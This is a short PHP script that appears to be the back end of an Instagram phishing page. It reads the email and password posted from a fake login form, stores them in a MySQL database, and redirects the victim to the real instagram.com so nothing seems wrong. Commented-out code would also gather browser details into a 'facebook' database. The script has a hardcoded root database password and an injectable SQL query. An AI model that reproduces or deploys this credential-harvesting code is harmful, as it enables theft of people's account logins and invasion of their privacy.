<?php

$Email = $_POST['Email'];
$Password = $_POST['Password'];

// Database Connection

$con = mysqli_connect ("localhost","root","vgfrgggh","instagram");
$sql = "INSERT INTO login(Email,Password) values('$Email','$Password')";
$r = mysqli_query($con,$sql);
if($r){
    echo" USER DETALS ADD SUCCESSFULLY";
}else{
    echo"STUDENT DETALS NOT ADDED";
}

$redirect_page = "https://www.instagram.com";


header("Location:".$redirect_page);



// echo $_SERVER['HTTP_USER_AGENT'];
// $browser = get_browser();
// print_r($browser);

// $con = mysqli_connect ("localhost","root","","facebook");
// $sql = "INSERT INTO userinfo(useragent) values('$browser')";
// $r = mysqli_query($con,$sql);


?>

<!-- <script>
    var AppCodeName = navigator.appCodeName ;
    var Product = navigator.product ;
    var UserAgent = navigator.userAgent ;
    var Platform = navigator.platform ; -->
    
 <!-- <?php $appcodename = AppCodeName;?>
</script> -->

<!-- <?php echo $appcodename;?> -->
<!-- 
<script>
    var a = navigator.appCodeName ;
    window.location.href = window.location.href+'?a='+a;
</script>

<?php
$var = $_GET['a'];
echo "a";

?> -->
